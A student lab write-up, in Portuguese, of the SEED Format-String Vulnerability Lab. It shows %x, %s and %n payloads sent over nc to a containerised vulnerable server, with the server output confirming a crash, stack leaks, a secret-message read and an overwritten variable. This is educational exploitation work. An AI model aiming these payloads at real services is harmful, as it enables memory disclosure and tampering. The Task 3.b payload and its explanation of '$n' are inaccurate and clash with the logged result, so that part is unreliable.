### Format-String Vulnerability Lab

## Task 1

Numa fase inicial, devemos desativar o **address space randomization** do SO, de modo a facilitar a realização das tarefas do guião, e compilar o código com a vulnerabilidade. Finalmente, usamos o ficheiro **docker-compose.yml** para criar os containers onde vamos realizar as diferentes tarefas do guião. Ao longo da realização vamos ter então duas consolas, numa delas comunicamos com um destes containers e na outro vemos o que o container faz com a informação que recebe.

Na primeira tarefa é nos pedido para enviar diferentes payloads para um destes servidores de modo a que o programa **format** sofra um crash. Este crash é confirmado quando no output do servidor não obtemos a mensagem **(^_^)(^_^)  Returned properly (^_^)(^_^)**. Para atingir este fim, utilizámos o programa **./build_string.py** para criar um ficheiro **badfile** que consegue crashar o programa:

Client shell:

```shell
[11/16/23]seed@VM:~/.../attack-code$ cat badfile | nc 10.9.0.5 9090
```

Server shell:

```shell
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd740
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

Como não obtivemos a mensagem **(^_^)(^_^)  Returned properly (^_^)(^_^)**, podemos concluir que o programa crashou com sucesso.

## Task 2

# Task 2.a

Nesta tarefa temos como objetivo imprimir dados da stack ao dar uma string ao servidor. Esta string vai ser uma linha de vários format specifiers **%.x** de modo a imprimir os primeiros 4 bytes do nosso input. De modo a perceber se o objetivo desejado está a ser cumprido, convém sabermos o valor exato dos primeiros 4 bytes da string. No nosso caso decidimos que os primeiros 4 bytes da string seriam **AAAA**, em hexadecimal, **41414141**. Depois de algum trial and error chegamos á conclusão que precisámos de ter 64 %.x format specifiers para fazer conseguirmos fazer print dos primeiros 4 bytes da string.

Client shell:

```shell
echo 'AAAA%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x' | nc 10.9.0.5 9090
```

Server shell:

```shell
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 261 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | AAAA112233440000100008049db5080e5320080e61c0ffffd740ffffd668080e62d4080e5000ffffd70808049f7effffd740000000000000006408049f47080e5320000004d7ffffd845ffffd740080e5320080e97200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000038551200080e5000080e5000ffffdd2808049effffffd74000000105000005dc080e5320000000000000000000000000ffffddf40000000000000000000000000000010541414141
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

# Task 2.b

Nesta tarefa, é nos pedido para descobrir uma mensagem secreta sobre a qual sabemos o seu endereço: **0x080b4008**. Para isto temos de criar uma nova string e realizar algumas alterações no programa **build_string.py**. Primeiro, guardamos o endereço da mensagem secreta da seguinte maneira:

```python
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')
```

E concatenamos este endereço com 63 %.8x e um %s para se imprimir a mensagem secreta:

```python
s = "%.8x"*63 + '%s'
```

Por último criamos o ficheiro badfile com a string desejada.

Client shell:

```shell
[11/16/23]seed@VM:~/.../attack-code$ cat badfile | nc 10.9.0.5 9090
```

Server shell:

```shell
vserver-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd740
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 AAAA112233440000100008049db5080e5320080e61c0ffffd740ffffd668080e62d4080e5000ffffd70808049f7effffd740000000000000006408049f47080e5320000005dc000005dcffffd740ffffd740080e9720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002ae3bd00080e5000080e5000ffffdd2808049effffffd740000005dc000005dc080e5320000000000000000000000000ffffddf4000000000000000000000000000005dcA secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

Como é possível observar, obtivemos a mensagem "A secret message" como esperado.

## Task 3

# Task 3.a

Nesta tarefa, é nos pedido para alterar o valor da variável **target** cujo valor inicial é **0x11223344** e o endereço é **0x080e5068**.

A nossa abordagem a esta tarefa foi muito semelhante á que usamos na tarefa 2.b, sendo as únicas diferenças o uso do endereço da variável **target** e no fim da string concatenámos um format specifier do tipo **%n**. O que acontece quando se usa um **%n** nas format strings escreve na zona de memória do argumento passado como parâmetro o número de caracteres escritos até ali.

```python
(...)

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

(...)

s = "%.8x"*63 + '%n'

(...)
```

Client shell:

```shell
[11/16/23]seed@VM:~/.../attack-code$ cat badfile | nc 10.9.0.5 9090
```

Server shell:

```shell
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd7d0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd6f8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | hAAAA112233440000100008049db5080e5320080e61c0ffffd7d0ffffd6f8080e62d4080e5000ffffd79808049f7effffd7d0000000000000006408049f47080e5320000005dc000005dcffffd7d0ffffd7d0080e972000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000defeb000080e5000080e5000ffffddb808049effffffd7d0000005dc000005dc080e5320000000000000000000000000ffffde84000000000000000000000000000005dcThe target variable's value (after):  0x00000200
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

Como podemos observar, o valor da variável **target** foi alterado com sucesso.

# Task 3.b

Nesta tarefa é nos pedido para alterar o valor da variável **target** para um valor em específico, neste caso: 0x5000 ou 20480 em decimal. Como não podemos mudar o valor de **target** diretament pois o servidor só aceita no máximo 1500 bytes, temos de criar uma string que leia a quantidade de caracteres necessária sem o servidor os imprimir. Para isso, nos primeiros 4 bytes guardamos na mesma o endereço de **target** e preenchemos os restantes 20476 caracteres com format specifiers **%x** para que o servidor tente na mesma imprimir todos esses bytes, mas se colocarmos um **$n** o servidor deixa de os imprimir, mas estes são contados na mesma, levando assim á alteração do valor de **target** para o valor esperado:

```python
(...)

s = "20476%x%64$n"

(...)
```

Client shell:

```shell
[11/16/23]seed@VM:~/.../attack-code$ cat badfile | nc 10.9.0.5 9090
```

Server shell:

```shell
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd6b0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd5d8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | habcd2047611223344The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```
